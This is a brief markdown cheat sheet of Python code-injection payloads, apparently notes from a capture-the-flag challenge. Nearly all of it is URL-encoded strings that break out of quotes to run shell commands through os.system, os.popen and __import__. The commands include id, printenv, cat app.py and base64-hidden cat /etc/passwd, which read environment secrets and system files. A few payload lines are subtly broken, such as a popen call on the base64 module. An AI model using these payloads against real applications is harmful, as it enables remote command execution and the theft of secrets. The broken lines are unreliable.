# Python injections

1. How to

```
Inject double quote will make Internal server error
```

2. Inject commands with closed quotes

```
"%2bstr(True)%2b"test
"%2bstr(os.system('id'))%2b"test
"%2bstr(os.system('pwd'))%2b"test
"%2bstr(os.popen('pwd').read())%2b"test
```

3. Injecting commands

The fact that both str() and True are available give us a pretty good chance that Python is used. For the rest of the challenge we will put our payload inside of the call to str().

Now, we want to get to code execution. We can try to use os.system('id') for example.

It may also be valuable to get the value returned by the command. To do this, you can use: os.popen('[CMD]').read() instead of os.system('[CMD]').

4. Import modules while injecting code

If we try to use os.system('id') for example. we get an error message. This is likely due to the fact that the os module (that we need to access system) is not loaded. We can use the following syntax to load and run the system function: __import__('os').system(...

```
__import__('os').system
"%2bstr(__import__('os').popen('id').read())%2b"test
user"%2bstr(__import__('os').popen('id').read())%2b"
user"%2bstr(__import__('os').popen('cat app.py').read())%2b"
user"%2bstr(__import__('os').popen('cd ..;ls -la').read())%2b"
user"%2bstr(__import__('os').popen('cd ..;pwd').read())%2b"
user"%2bstr(__import__('os').popen('printenv').read())%2b"
```

5. Encode comands

```
user"%2bstr(__import__('base64').popen('L3Vzci9sb2NhbC9iaW4vc2NvcmUgYmMxYTZkYTUtMGNjOC00OTY0LWJiOTktYWQ4NDg3NDIxZGZk').read())%2b"
user"%2bstr(__import__('os').popen('uname').read())%2b"
// echo 'cat /etc/passwd' | base64 > Y2F0IC9ldGMvcGFzc3dkCg==
user"%2bstr(__import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dkCg=='))%2b"
user"%2bstr(__import__('os').popen(__import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dkCg==')).read())%2b"
```
